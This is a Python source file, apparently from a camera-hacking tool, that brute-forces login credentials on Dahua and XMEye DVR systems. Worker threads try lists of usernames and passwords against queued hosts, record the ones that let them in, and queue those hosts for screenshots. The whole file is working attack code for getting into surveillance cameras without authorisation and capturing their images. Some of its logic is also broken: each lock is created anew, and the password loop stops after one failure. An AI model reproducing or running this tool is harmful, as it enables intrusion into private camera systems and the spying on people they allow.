import logging
import threading

import config
from dahua import DahuaController, Status
from xmeye import XMEye

DVR = {
    'default': DahuaController,
    '37777': DahuaController,
    '34567': XMEye
}


class BruteThread(threading.Thread):
    def __init__(self, brute_queue, screenshot_queue):
        threading.Thread.__init__(self)
        self.brute_queue = brute_queue
        self.screenshot_queue = screenshot_queue
        self._dvr = DVR['default']

    def run(self):
        while True:
            with threading.Lock():
                host = self.brute_queue.get()
            if host[1] in DVR:
                self._dvr = DVR[host[1]]
            self.dvr_auth(host)
            self.brute_queue.task_done()

    def dvr_login(self, login, password):
        with threading.Lock():
            config.update_status()
            logging.debug(f'Login attempt: {self._dvr.ip} with {login}:{password}')
        self._dvr.auth(login, password)
        if self._dvr.status is Status.SUCCESS:
            logging.debug(f'Success login: {self._dvr.ip} with {login}:{password}')
            return self._dvr
        elif self._dvr.status is Status.BLOCKED:
            logging.debug(f'Blocked camera: {self._dvr.ip}:{self._dvr.port}')
            return None
        else:
            logging.debug(f'Unable to login: {self._dvr.ip}:{self._dvr.port} with {login}:{password}')
            return None

    def dvr_auth(self, host):
        self._dvr.ip = host[0]
        self._dvr.port = int(host[1])
        for login in config.logins:
            for password in config.passwords:
                try:
                    res = self.dvr_login(login, password)
                    if res is None:
                        break
                    config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
                    config.ch_count += res.channels_count
                    self.screenshot_queue.put(res)
                    return
                except Exception as e:
                    logging.debug(f'Connection error: {self._dvr.ip}:{self._dvr.port} - {str(e)}')
                    return
